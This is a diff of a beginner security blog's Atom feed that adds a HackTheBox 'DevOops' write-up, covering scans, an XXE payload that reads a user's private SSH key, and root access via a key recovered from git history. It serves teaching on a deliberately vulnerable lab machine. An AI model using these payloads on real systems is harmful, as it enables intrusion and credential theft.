@@ -1,4 +1,237 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-08-19T15:16:32+02:00</updated><id>http://localhost:4000/</id><title type="html">Computer Security for Beginners</title><subtitle>Computer security oriented blog held by a french student in IT and Networks. This blog aims at teaching the fundamentals of Cyber Security to beginners through CTF write-ups and didactic articles.</subtitle><author><name>BoiteAKlou</name></author><entry><title type="html">Steganography Tutorial: Least Significant Bit (LSB)</title><link href="http://localhost:4000/tutorial/stegano/2018/08/12/Steganography-Least-Significant-Bit.html" rel="alternate" type="text/html" title="Steganography Tutorial: Least Significant Bit (LSB)" /><published>2018-08-12T18:00:00+02:00</published><updated>2018-08-12T18:00:00+02:00</updated><id>http://localhost:4000/tutorial/stegano/2018/08/12/Steganography-Least-Significant-Bit</id><content type="html" xml:base="http://localhost:4000/tutorial/stegano/2018/08/12/Steganography-Least-Significant-Bit.html">&lt;p&gt;This article details a common steganography method known as the Least Significant Bit. This technique is very efficient because of its &lt;strong&gt;simplicity&lt;/strong&gt; and its ability to be &lt;strong&gt;undetectable to the naked eye&lt;/strong&gt;. After reading this, you’ll be able to hide a message inside a picture using this technique, but also to detect any dissimulated message.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-10-13T20:55:09+02:00</updated><id>http://localhost:4000/</id><title type="html">Computer Security for Beginners</title><subtitle>Computer security oriented blog held by a french student in IT and Networks. This blog aims at teaching the fundamentals of Cyber Security to beginners through CTF write-ups and didactic articles.</subtitle><author><name>BoiteAKlou</name></author><entry><title type="html">HackTheBox: DevOops writeup</title><link href="http://localhost:4000/2018/10/10/HackTheBox-DevOops.html" rel="alternate" type="text/html" title="HackTheBox: DevOops writeup" /><published>2018-10-10T10:00:00+02:00</published><updated>2018-10-10T10:00:00+02:00</updated><id>http://localhost:4000/2018/10/10/HackTheBox-DevOops</id><content type="html" xml:base="http://localhost:4000/2018/10/10/HackTheBox-DevOops.html">&lt;p&gt;Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-10/devoops-box.png&quot; alt=&quot;DevOops box&quot; title=&quot;DevOops Box&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In this article, I’ll detail every step I’ve gone through in order to root the DevOops box, from the reconnaissance phate to the privilege escalation.
+ &lt;!--excerpt--&gt;&lt;/p&gt;
+
+&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;
+
+&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#recon&quot; id=&quot;markdown-toc-recon&quot;&gt;Recon&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#port-scanning&quot; id=&quot;markdown-toc-port-scanning&quot;&gt;Port scanning&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#web-application-mapping&quot; id=&quot;markdown-toc-web-application-mapping&quot;&gt;Web Application Mapping&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#from-xxe-to-user-access&quot; id=&quot;markdown-toc-from-xxe-to-user-access&quot;&gt;From XXE to User access&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#getting-root&quot; id=&quot;markdown-toc-getting-root&quot;&gt;Getting root&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#enumeration&quot; id=&quot;markdown-toc-enumeration&quot;&gt;Enumeration&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#sensitive-git-repository&quot; id=&quot;markdown-toc-sensitive-git-repository&quot;&gt;Sensitive git repository&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
+
+&lt;p&gt;The only information we get when starting a new box is the IP address of the machine. With experience, you’ll develop your own reconnaissance routine but I think that all of them start with the good old nmap port scanning.&lt;/p&gt;
+
+&lt;h3 id=&quot;port-scanning&quot;&gt;Port scanning&lt;/h3&gt;
+
+&lt;p&gt;Nmap is a very powerful tool offering a lot of features and options that can be a bit tricky to use for beginners. First, we will perform a fast scan of TCP open ports with OS and services version detection.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:/DevOops&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 10.10.10.91
+    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    | ssh-hostkey: 
+    |   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    |   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    |_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    5000/tcp open  http    Gunicorn 19.7.1
+    | http-methods: 
+    |_  Supported Methods: HEAD OPTIONS GET
+    |_http-server-header: gunicorn/19.7.1
+    |_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html; charset=utf-8).
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;In a future article dedicated to reconnaissance, I’ll show more Nmap commands that can be very useful in other contexts.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The scan output reveals &lt;strong&gt;ssh&lt;/strong&gt; on port 22 and an &lt;strong&gt;http server&lt;/strong&gt; listening on the non-standard port 5000. We also have service versions to keep in mind for an eventual exploit.&lt;/p&gt;
+
+&lt;p&gt;Let’s investigate this Web application and come back to if we hit a deadend.&lt;/p&gt;
+
+&lt;h2 id=&quot;web-application-mapping&quot;&gt;Web Application Mapping&lt;/h2&gt;
+
+&lt;p&gt;First, reach this URL (http://10.10.10.91:5000) with a web browser.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-10/webapp.png&quot; alt=&quot;Website&quot; title=&quot;Website&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The page doesn’t show any link or dynamic content so let’s run &lt;strong&gt;dirb&lt;/strong&gt; in order to discover valid URLs.
+Dirb is a web content scanner which bruteforces directories and files names on web servers.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:/DevOops&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dirb http://10.10.10.91:5000
+
+&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
+DIRB v2.22    
+By The Dark Raver
+&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
+
+START_TIME: Thu Oct 11 23:16:57 2018
+URL_BASE: http://10.10.10.91:5000/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
+
+GENERATED WORDS: 4612                                                          
+
+&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Scanning URL: http://10.10.10.91:5000/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
++ http://10.10.10.91:5000/feed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:546263&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                               
++ http://10.10.10.91:5000/upload &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:347&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                
+                                                                                                                                                    
+&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
+END_TIME: Thu Oct 11 23:22:22 2018
+DOWNLOADED: 4612 - FOUND: 2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Good news! Upload features are generally poorly secured inside web applications. Let’s visit this page!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-10/upload.png&quot; alt=&quot;Upload page&quot; title=&quot;Upload page&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;from-xxe-to-user-access&quot;&gt;From XXE to User access&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Xml eXternal Entities&lt;/strong&gt; is an exploit based on weakly configured XML parsers that allow arbitrary file reading on the webserver.&lt;/p&gt;
+
+&lt;p&gt;Since this web application wants us to upload XML files, it seemed natural to me to test this vulnerability.&lt;/p&gt;
+
+&lt;p&gt;I used the following payload:&lt;/p&gt;
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!--?xml version=&quot;1.0&quot; ?--&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY example &quot;Doe&quot;&amp;gt;&lt;/span&gt; ]&amp;gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;Book&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Author&amp;gt;&lt;/span&gt;BoiteAKlou&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Author&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Subject&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;example;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Subject&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Content&amp;gt;&lt;/span&gt;Payload&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Content&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Book&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;And here is the output from the server:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PROCESSED BLOGPOST: Author: BoiteAKlou Subject: Doe Content: Payload URL for later reference: /uploads/test2.xml File path: /home/roosa/deploy/src&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;We see that the Subject has been replaced by &lt;strong&gt;Doe&lt;/strong&gt; so the server is vulnerable.&lt;/p&gt;
+
+&lt;p&gt;At this point, we can retrieve a bunch of interesting files or get &lt;strong&gt;roosa’s private ssh key&lt;/strong&gt; and then login via ssh.&lt;/p&gt;
+
+&lt;p&gt;Here’s the payload I used:&lt;/p&gt;
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!--?xml version=&quot;1.0&quot; ?--&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo [
+&amp;lt;!ELEMENT foo ANY&amp;gt;&lt;/span&gt; 
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///home/roosa/.ssh/id_rsa&quot; &amp;gt;&lt;/span&gt;]&amp;gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;Book&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Author&amp;gt;&lt;/span&gt;BoiteAKlou&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Author&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Subject&amp;gt;&lt;/span&gt;Payload&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Subject&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Content&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Content&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Book&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once the private key retrieved, we can connect via ssh and enjoy the user flag:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:/DevOops&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa roosa@10.10.10.91
+Welcome to Ubuntu 16.04.4 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 4.13.0-37-generic i686&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Documentation:  https://help.ubuntu.com
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Management:     https://landscape.canonical.com
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Support:        https://ubuntu.com/advantage
+
+135 packages can be updated.
+60 updates are security updates.
+
+Last login: Thu Oct 11 17:27:36 2018 from 10.10.12.226
+roosa@gitter:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt 
+c5808e[..]ecc67b
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now things are getting serious…&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-root&quot;&gt;Getting root&lt;/h2&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+
+&lt;p&gt;Every privilege escalation requires an exhaustive enumeration of the system. This is quite a long process which can be facilitated by scripts such as &lt;a href=&quot;https://github.com/rebootuser/LinEnum&quot;&gt;LinEnum&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;I won’t detail here my whole process of enumerating, only the relevant part in our case.&lt;/p&gt;
+
+&lt;p&gt;The TODO note we found when consulting the website suggested that this project was versioned. In that case, it could be interesting to retrieve the content of a &lt;strong&gt;git&lt;/strong&gt; or &lt;strong&gt;svn&lt;/strong&gt; folder.&lt;/p&gt;
+
+&lt;p&gt;You can use the following command to look for any &lt;strong&gt;.git&lt;/strong&gt; directory:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; d &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; .git 2&amp;gt;/dev/null
+./work/blogfeed/.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Great we found one! Let’s see what we can learn from it…&lt;/p&gt;
+&lt;h3 id=&quot;sensitive-git-repository&quot;&gt;Sensitive git repository&lt;/h3&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git log&lt;/code&gt; shows us every commit message from this repository and the two commits below caught my attention:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;commit 33e87c312c08735a02fa9c796021a4a3023129ad
+Author: Roosa Hakkerson &amp;lt;roosa@solita.fi&amp;gt;
+Date:   Mon Mar 19 09:33:06 2018 -0400
+
+    reverted accidental commit with proper key
+
+commit d387abf63e05c9628a59195cec9311751bdb283f
+Author: Roosa Hakkerson &amp;lt;roosa@solita.fi&amp;gt;
+Date:   Mon Mar 19 09:32:03 2018 -0400
+
+    add key for feed integration from tnerprise backend
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I immediately jumped back to the commit where the key was accidentaly added, thanks to this command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~/work/blogfeed&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout d387abf63e05c9628a59195cec9311751bdb283f
+error: Your &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;changes to the following files would be overwritten by checkout:
+	run-gunicorn.sh
+Please, commit your changes or stash them before you can switch branches.
+Aborting
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Crap! We have unstaged changes. No problem, we can tell git to ignore these changes with &lt;code class=&quot;highlighter-rouge&quot;&gt;git checkout -- run-gunicorn.sh&lt;/code&gt; and then re-execute it.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~/work/blogfeed&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout d387abf63e05c9628a59195cec9311751bdb283f
+Note: checking out &lt;span class=&quot;s1&quot;&gt;'d387abf63e05c9628a59195cec9311751bdb283f'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+You are &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'detached HEAD'&lt;/span&gt; state. You can look around, make experimental
+changes and commit them, and you can discard any commits you make &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this
+state without impacting any branches by performing another checkout.
+
+If you want to create a new branch to retain commits you create, you may
+&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;so &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;now or later&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; by using &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; with the checkout &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;again. Example:
+
+  git checkout &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &amp;lt;new-branch-name&amp;gt;
+
+HEAD is now at d387abf... add key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;feed integration from tnerprise backend
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Better! The file &lt;strong&gt;authcredentials.key&lt;/strong&gt; has appeared inside resources/integration/.
+Let’s try to login as root using this key:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~/work/blogfeed&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; resources/integration/authcredentials.key root@localhost
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0664 &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'resources/integration/authcredentials.key'&lt;/span&gt; are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key &lt;span class=&quot;s2&quot;&gt;&quot;resources/integration/authcredentials.key&quot;&lt;/span&gt;: bad permissions
+root@localhost&lt;span class=&quot;s1&quot;&gt;'s password: 
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;SSH refuses to use this key because permissions are too open. We can fix this with &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod 0600 resources/integration/authcredentials.key&lt;/code&gt; and try to connect again.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~/work/blogfeed&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; resources/integration/authcredentials.key root@localhost
+Welcome to Ubuntu 16.04.4 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 4.13.0-37-generic i686&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Documentation:  https://help.ubuntu.com
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Management:     https://landscape.canonical.com
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Support:        https://ubuntu.com/advantage
+
+135 packages can be updated.
+60 updates are security updates.
+
+Last login: Fri Oct 12 04:48:17 2018 from 10.10.13.23
+root@gitter:~# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Bingo! Enjoy the flag :wink:&lt;/p&gt;
+
+&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out. In this article, I’ll detail every step I’ve gone through in order to root the DevOops box, from the reconnaissance phate to the privilege escalation.</summary></entry><entry><title type="html">Steganography Tutorial: Least Significant Bit (LSB)</title><link href="http://localhost:4000/tutorial/stegano/2018/08/12/Steganography-Least-Significant-Bit.html" rel="alternate" type="text/html" title="Steganography Tutorial: Least Significant Bit (LSB)" /><published>2018-08-12T18:00:00+02:00</published><updated>2018-08-12T18:00:00+02:00</updated><id>http://localhost:4000/tutorial/stegano/2018/08/12/Steganography-Least-Significant-Bit</id><content type="html" xml:base="http://localhost:4000/tutorial/stegano/2018/08/12/Steganography-Least-Significant-Bit.html">&lt;p&gt;This article details a common steganography method known as the Least Significant Bit. This technique is very efficient because of its &lt;strong&gt;simplicity&lt;/strong&gt; and its ability to be &lt;strong&gt;undetectable to the naked eye&lt;/strong&gt;. After reading this, you’ll be able to hide a message inside a picture using this technique, but also to detect any dissimulated message.&lt;/p&gt;
 
 &lt;p&gt;&lt;!--excerpt--&gt;&lt;/p&gt;
 
@@ -1160,7 +1393,7 @@ We won’t need more than the first two equations in order to find the key.&lt;/
 &lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-06-05/challenge.png&quot; alt=&quot;challenge statement&quot; title=&quot;Statement&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;We have &lt;a href=&quot;/assets/2018-06-05/cookiePublic.c&quot;&gt;a binary&lt;/a&gt; and the corresponding &lt;a href=&quot;/assets/2018-06-05/cookiePublic64&quot;&gt;source code&lt;/a&gt; given for this challenge. The objective is to find a way to exploit this binary locally and to re-use the same exploit on the remote server in order to get the flag.&lt;/p&gt;
+&lt;p&gt;We have &lt;a href=&quot;/assets/2018-06-05/cookiePublic64&quot;&gt;a binary&lt;/a&gt; and the corresponding &lt;a href=&quot;/assets/2018-06-05/cookiePublic.c&quot;&gt;source code&lt;/a&gt; given for this challenge. The objective is to find a way to exploit this binary locally and to re-use the same exploit on the remote server in order to get the flag.&lt;/p&gt;
 
 &lt;p&gt;The first thing we should do in this case is to analyze the program and its source code.&lt;/p&gt;
 
